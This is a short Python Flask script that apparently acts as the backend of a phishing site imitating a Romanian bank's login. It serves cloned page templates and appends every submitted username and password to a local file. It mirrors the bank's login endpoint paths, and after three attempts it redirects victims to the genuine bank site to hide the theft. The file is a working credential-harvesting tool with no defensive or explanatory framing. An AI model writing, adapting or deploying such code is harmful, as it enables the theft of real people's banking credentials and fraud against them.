#! /usr/bin/env python


from flask import *

C = 3


app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")

@app.route('/<path:path>')
def resource(path):
    return send_from_directory('templates', path)

@app.route("/submit", methods=["POST"])
def submit():
    global C
    usr = request.form.get("username")
    pwd = request.form.get("password")
    with open("pass.txt", "a") as stream:
        stream.write("{}:{}\n".format(usr, pwd))
    C = max(0, C - 1)
    if C <= 0:
        return redirect("https://www.homebank.ro/")
    return redirect(url_for("index"))

@app.route("/pkmslogin.form", methods=["POST"])
def submit2():
    return redirect(url_for("submit"), code=307)


@app.route("/trustbuilder-web/html/main_eai", methods=["POST"])
def submit3():
    return redirect(url_for("submit"), code=307)


app.run(host="0.0.0.0", port=8080, threaded=True)
